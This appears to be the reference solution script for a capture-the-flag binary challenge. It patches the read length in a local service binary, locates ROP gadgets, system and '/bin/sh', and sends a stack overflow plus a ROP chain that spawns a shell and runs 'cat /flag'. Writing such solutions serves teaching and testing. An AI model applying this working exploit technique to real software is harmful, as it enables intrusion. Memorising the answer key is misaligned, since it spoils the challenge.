#!/usr/bin/env bash
# Reference solution for the byte-challenge — local.
#
#   ./solve/solve.sh
#
# Computes the file offset of the `0x40` byte inside main's
# `read(0, buf, 64)` call from the unstripped byte.dbg, drives run.py
# with a fixed all-zero salt to flip that byte to 0x78 (= 120, the
# exact size of the ROP payload below), then sends the BOF + ROP chain
# followed by `id; cat /flag` to the spawned shell.

set -euo pipefail

cd "$(dirname "$0")/../service"

dbg=byte.dbg
bin=byte
if [[ ! -f $dbg || src/echo.c -nt $dbg ]]; then
    make -C src
    cp src/$bin $bin
    cp src/$dbg $dbg
fi

python3 - <<'PY'
import re, struct, subprocess, sys
from elftools.elf.elffile import ELFFile

p = lambda x: struct.pack("<Q", x)

# 1) Locate the 0x40 byte inside main's read(0, buf, 64) call.
#    It's the immediate byte of `mov edx, 0x40` (BA 40 00 00 00) inside
#    main. Disassemble main, find that instruction, translate its vaddr
#    to a file offset (and add 1 to skip the `BA` opcode).
addr_main = None
text_vaddr = text_foff = None
syms = {}
binsh_vaddr = None
with open("byte.dbg", "rb") as f:
    elf = ELFFile(f)
    for sec in elf.iter_sections():
        if sec.name == ".text":
            text_vaddr = sec["sh_addr"]
            text_foff  = sec["sh_offset"]
        if sec.name == ".symtab":
            for s in sec.iter_symbols():
                if s.name in ("main", "system", "__libc_system"):
                    syms[s.name] = s["st_value"]
        if sec.name == ".rodata":
            ro_vaddr = sec["sh_addr"]
            ro_foff  = sec["sh_offset"]
            ro_size  = sec["sh_size"]
            f.seek(ro_foff)
            data = f.read(ro_size)
            i = data.find(b"/bin/sh\x00")
            if i >= 0:
                binsh_vaddr = ro_vaddr + i

assert text_vaddr is not None, "no .text"
assert "main" in syms, "no main symbol"
assert binsh_vaddr is not None, "/bin/sh string not found in .rodata"
system_vaddr = syms.get("system") or syms["__libc_system"]

dis = subprocess.check_output(
    ["objdump", "-d", "--disassemble=main", "-M", "intel", "byte.dbg"]
).decode()

m = re.search(r"^\s*([0-9a-f]+):\s*ba 40 00 00 00\s*mov\s+edx,0x40", dis, re.M)
assert m, "couldn't find `mov edx, 0x40` in main"
insn_vaddr = int(m.group(1), 16)
patch_vaddr = insn_vaddr + 1                                   # skip BA opcode
patch_foff  = patch_vaddr - text_vaddr + text_foff

# 2) Find a `pop rdi ; pop rbp ; ret` gadget in .text (5f 5d c3).
with open("byte.dbg", "rb") as f:
    full = f.read()
text_size = 0x80000  # generous upper bound; we only need the first match
text_end  = text_foff + text_size
gadget_off = full.find(b"\x5f\x5d\xc3", text_foff, text_end)
assert gadget_off > 0, "no pop rdi; pop rbp; ret gadget"
gadget_vaddr = gadget_off - text_foff + text_vaddr

print(f"main         = 0x{syms['main']:x}",       file=sys.stderr)
print(f"system       = 0x{system_vaddr:x}",       file=sys.stderr)
print(f"/bin/sh      = 0x{binsh_vaddr:x}",        file=sys.stderr)
print(f"pop rdi/rbp  = 0x{gadget_vaddr:x}",       file=sys.stderr)
print(f"patch foff   = {patch_foff} (0x{patch_foff:x})", file=sys.stderr)

# 3) Build the ROP payload.
#    Stack: 0x50 frame + 8 saved rbp = 88 bytes before saved RIP.
#    pop_rdi_pop_rbp_ret naturally re-aligns rsp for system's movaps.
rop  = b"A" * 88
rop += p(gadget_vaddr)
rop += p(binsh_vaddr)
rop += p(0)                                # rbp dummy
rop += p(system_vaddr)
assert len(rop) == 120, len(rop)

PATCH_BYTE = 120                           # 0x78 — equals payload length
shell_cmds = b"id\ncat /flag 2>/dev/null || cat /tmp/flag\nexit\n"

# 4) Drive run.py with salt=00 (XOR identity) so the submitted byte
#    is the byte actually written.
r = subprocess.run(
    ["./run.py", "--salt", "00",
     "--patch", str(patch_foff), f"{PATCH_BYTE:02x}"],
    input=rop + shell_cmds,
    capture_output=True, timeout=15,
)
sys.stdout.buffer.write(r.stdout)
if r.stderr:
    sys.stderr.buffer.write(r.stderr)
print(f"--- run.py exit {r.returncode} ---", file=sys.stderr)
PY
